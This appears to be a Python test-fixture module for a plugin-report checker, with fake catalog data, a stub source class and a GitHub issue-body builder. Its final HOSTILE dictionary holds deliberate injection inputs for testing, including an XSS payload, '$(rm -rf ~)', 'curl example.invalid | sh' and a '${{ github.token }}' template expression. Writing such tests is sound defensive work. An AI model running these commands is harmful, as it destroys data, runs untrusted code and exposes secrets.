"""Fictional data for the checker's tests. Nothing here is a real plugin."""

from omaworks.check import SourceError

LONG_ID = "io.example.a-very-long-plugin-identifier-for-a-rain-radar-widget"

CATALOG = [
    {"id": "example.sky-clock", "repo": "https://github.com/example-dev/sky-clock"},
    {"id": "example.moon-phase", "repo": "https://github.com/example-dev/moon-phase"},
    {"id": "example.suite-bar", "repo": "https://github.com/example-dev/suite"},
    {"id": "example.suite-panel", "repo": "https://github.com/example-dev/suite"},
    {"id": "tidepool", "repo": "https://github.com/example-dev/tidepool"},
    {"id": LONG_ID, "repo": "https://github.com/example-dev/rain-radar"},
    {"id": LONG_ID[:-1] + "x", "repo": "https://github.com/example-dev/rain-radar-x"},
]

TAGS = {"v4.0.0-beta3", "v4.0.3", "v4.5.0-rc1", "v4.5.0-rc2", "v4.5.0"}

# Public repos outside the catalog, as GitHub names them.
REPOS = {"example-dev/weather-strip": "example-dev/weather-strip"}


class FakeSources:
    """The checker's sources with fixed data. Counts calls."""

    def __init__(self, catalog=None, tags=None, repos=None, fail=False):
        self._catalog = CATALOG if catalog is None else catalog
        self._tags = TAGS if tags is None else tags
        self._repos = REPOS if repos is None else repos
        self.fail = fail
        self.calls = []

    def catalog(self):
        self.calls.append(("catalog",))
        if self.fail:
            raise SourceError("catalog down")
        return self._catalog

    def omarchy_tag_exists(self, tag):
        self.calls.append(("tag", tag))
        if self.fail:
            raise SourceError("api down")
        return tag in self._tags

    def github_repo(self, owner, name):
        self.calls.append(("repo", owner, name))
        if self.fail:
            raise SourceError("api down")
        return self._repos.get(f"{owner}/{name}".lower())


def body(
    plugin="example.sky-clock",
    omarchy="4.5.0-3",
    commit="3f2a91c",
    result="Works",
    what="The clock shows the time.",
    errors=None,
):
    """An issue body as GitHub writes the report form."""
    errors_text = "_No response_" if errors is None else f"```text\n{errors}\n```"
    return (
        f"### Plugin\n\n{plugin}\n\n"
        f"### Omarchy version\n\n{omarchy}\n\n"
        f"### Plugin commit\n\n{commit}\n\n"
        f"### Result\n\n{result}\n\n"
        f"### What happens\n\n{what}\n\n"
        f"### Error lines\n\n{errors_text}"
    )


# A body written to break things: Markdown, HTML, mentions, issue links,
# shell characters, a template expression and a very long line.
HOSTILE = {
    "plugin": "@octo-team #1 <img src=x onerror=alert(1)> $(rm -rf ~) `id`",
    "omarchy": "${{ github.token }}; curl example.invalid | sh",
    "commit": "[click](https://example.invalid) <script>x</script>",
    "result": "**Works** && echo pwned",
    "what": "<details open><summary>hi</summary>@someone see #99</details>\n" + "A" * 70000,
    "errors": "```\n### Plugin\n\nexample.sky-clock\n```\n$HOME `whoami` \\x00",
}
